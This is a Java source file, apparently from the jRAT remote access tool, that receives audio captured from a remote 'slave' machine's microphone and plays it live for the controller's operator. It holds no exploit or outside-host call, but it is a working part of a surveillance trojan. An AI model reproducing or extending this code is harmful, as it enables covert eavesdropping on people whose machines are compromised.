package jrat.controller.packets.incoming;

import jrat.common.Logger;
import jrat.common.Sound;
import jrat.common.utils.DataUnits;
import jrat.controller.Slave;
import jrat.controller.ui.dialogs.DialogRemoteSoundCapture;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.SourceDataLine;
import java.io.DataInputStream;


public class Packet58ServerDownloadSoundCapture extends AbstractIncomingPacket {

	private static DataLine.Info info;
	private static SourceDataLine line;

	private static boolean initialized;

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		int quality = dis.readInt();
		
		DialogRemoteSoundCapture frame = DialogRemoteSoundCapture.INSTANCES.get(slave);
		if (!initialized) {
			AudioFormat format = Sound.getFormat(quality);
			
			info = new DataLine.Info(SourceDataLine.class, format);
			if (!AudioSystem.isLineSupported(info)) {
				throw new Exception("Sound line is not supported");
			}
			line = (SourceDataLine) AudioSystem.getLine(info);
			line.open(format);
			line.start();
			initialized = true;
		}

		int size = slave.readInt();
		Logger.log("Reading sound: " + DataUnits.getAsString(size));

		byte[] data = new byte[size];

		slave.getDataInputStream().readFully(data);

		if (frame != null && frame.isRunning()) {
			line.write(data, 0, data.length);
		}
	}

	public void close() {
		if (line != null) {
			line.close();
		}
	}

}
